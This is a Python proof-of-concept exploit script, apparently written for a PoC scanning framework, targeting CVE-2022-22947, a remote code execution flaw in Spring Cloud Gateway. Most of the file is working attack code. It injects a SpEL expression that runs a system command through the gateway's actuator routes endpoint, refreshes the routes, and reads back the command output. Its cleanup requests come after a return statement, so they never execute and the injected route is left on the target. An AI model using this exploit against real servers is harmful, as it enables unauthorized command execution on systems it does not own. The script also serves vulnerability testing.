# title: Spring Cloud Gateway远程代码执行漏洞 CVE-2022-22947
# author: antx
# cve-id: CVE-2022-22947

from poctools import BasicPoc


class CVE_2022_22947(BasicPoc):
    def __init__(self):
        super(CVE_2022_22947, self).__init__()
        self.name = "Spring Cloud Gateway远程代码执行漏洞"

    def verify(self, url: str) -> bool:
        headers1 = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
            'Content-Type': 'application/json'
        }

        headers2 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }


        payload = '''{\r
              "id": "socmap",\r
              "filters": [{\r
                "name": "AddResponseHeader",\r
                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
                }],\r
              "uri": "http://example.com",\r
              "order": 0\r
            }'''
        self.set_headers(headers1)
        re1 = self.post(url=url + "/actuator/gateway/routes/'socmap", data=payload)
        self.set_headers(headers2)
        re2 = self.post(url=url + "/actuator/gateway/refresh")
        re3 = self.get(url=url + "/actuator/gateway/routes/'socmap")
        if 'socmap' in re3.text:
            return True
            re4 = self.request(url=url + "/actuator/gateway/routes/'socmap", method='DELETE')
            re5 = self.post(url=url + "/actuator/gateway/refresh")
        return False


if __name__ == '__main__':
    url = "https://127.0.0.1/"
    poc = CVE_2022_22947()
    result = poc.run(url)
    print(f"{url} -> {result}")